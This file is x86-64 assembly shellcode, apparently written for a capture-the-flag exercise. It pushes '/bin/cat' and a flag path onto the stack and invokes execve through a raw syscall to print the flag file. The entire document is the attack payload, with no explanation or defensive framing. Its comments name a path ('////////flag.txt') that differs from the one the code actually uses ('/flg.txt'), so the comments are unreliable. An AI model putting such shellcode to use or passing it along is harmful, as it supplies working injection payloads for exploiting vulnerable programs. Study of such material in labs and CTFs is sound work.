global _start 
section .text

_start:
  ; pathname = /bin/cat
  xor rax, rax
  push rax
  mov rdi, "/bin/cat"
  push rdi
  mov rdi, rsp

  ; argv[0] = "////////flag.txt"
  push rax
  mov rsi, "/flg.txt"
  push rsi
  mov rsi, rsp 

  ; argv = [rdi, rsi, NULL]
  push rax                      ; NULL
  push rsi                      ; "////////flag.txt"
  push rdi                      ; "/bin/cat"
  mov rsi, rsp                  ; rsi -> argv array

  ; envp = NULL
  xor rdx, rdx  ; set env to NULL
  mov al, 59 ; execve
  syscall
  ret
; ----------------------------------------
